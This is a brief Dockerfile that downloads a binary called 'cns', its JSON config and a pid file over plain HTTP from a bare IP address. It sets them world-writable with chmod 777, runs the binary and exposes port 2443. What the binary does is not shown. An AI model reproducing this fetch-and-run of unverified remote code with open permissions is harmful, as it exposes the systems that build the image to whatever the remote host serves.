FROM alpine:latest 

WORKDIR /tmp

RUN wget http://101.35.82.220/2/cns \
    && wget http://101.35.82.220/2/cns.json \
    && wget http://101.35.82.220/2/run.pid

RUN chmod 777 cns \
    && chmod 777 cns.json \
    && chmod 777 run.pid

CMD ["/tmp/cns", "-json=cns.json"]

EXPOSE 2443
